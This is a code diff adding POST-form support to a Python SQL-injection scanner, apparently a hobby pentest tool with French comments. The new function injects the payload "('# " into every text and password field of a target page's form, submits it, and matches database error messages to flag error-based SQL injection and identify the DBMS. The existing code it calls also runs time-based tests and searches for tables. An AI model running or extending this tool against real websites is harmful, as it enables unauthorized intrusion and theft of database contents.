@@ -221,8 +221,65 @@ def search_tables(url, archives):
             index += len(remplacement)
 
 
+def test_post_error(url):
+    vulnerable = False
+    response = requests.get(url)
+    database = "Undefined"
+
+    if response.status_code == 200:
+   
+        html_content = response.content
+
+        soup = BeautifulSoup(html_content, "html.parser")
+
+        text_input_tags = soup.find_all("input", {"type": "text"})
+        password_input_tags = soup.find_all("input", {"type": "password"})
+
+        for input_tag in text_input_tags:
+            input_tag["value"] = "('# "
+
+        for input_tag in password_input_tags:
+         input_tag["value"] = "('# "
+
+         print("Payload = ('# ")
+
+        form_action = soup.find("form").get("action")
+        submit_url = url + form_action if form_action else url
+
+        form_data = {}
+        for input_tag in text_input_tags + password_input_tags:
+            name = input_tag.get("name")
+            value = input_tag.get("value")
+            if name:
+                form_data[name] = value
+
+
+        response = requests.post(submit_url, data=form_data)
+
+
+        if response.status_code == 200:
+            print("Requête POST réussie.")
+        # Affichage du contenu HTML de la réponse
+            
+            for dbms in DBMS_ERRORS:                    ##Cherche pour
+                for regex in DBMS_ERRORS[dbms]:         ## un mot cle dans la page d'erreur
+                    if re.search(regex, response.content.decode(), re.I) and not re.search(regex, soup.decode() , re.I) and vulnerable == False:
+                        print(Fore.RED + "Parameter ",text_input_tags," appears to be **ERROR** SQLi vulnerable")
+                        database = dbms
+                        vulnerable=True
+
+            print()
+            print(Fore.YELLOW+"Database type =", database)
+            print()
+
+        else:
+            print("Erreur lors de la requête POST.")
+    else:
+        print("Erreur lors de la requête au site web.")
+
 
 if __name__ == "__main__":
+
 
     parser = optparse.OptionParser()
     parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
@@ -230,10 +287,24 @@ if __name__ == "__main__":
     parser.add_option("-X", dest="request_type", help="Request type (e.g. \"POST\")")
     options, _ = parser.parse_args()
 
+    if options.request_type is None:
+        options.request_type = "GET"
+
+
+    if options.url is None:
+        print("Enter URL")
+        sys.exit(1)
+    if options.request_type != "GET" and options.request_type != "POST":
+        print("Enter request type POST or GET")
+        sys.exit(1)
+
     print(Fore.WHITE+"*------------------------------------------------------------------------*")
 
-    database=scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url)
-    test_time_attack(options.url)
 
-    if database is not "Undefined":
-        search_tables(options.url if options.url.startswith("http") else "http://%s" % options.url, options.archive )
+    if options.request_type == "GET":
+        database=scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url)
+        test_time_attack(options.url)
+        if database is not "Undefined" :
+            search_tables(options.url if options.url.startswith("http") else "http://%s" % options.url, options.archive )
+    if options.request_type == "POST":
+        test_post_error(options.url)
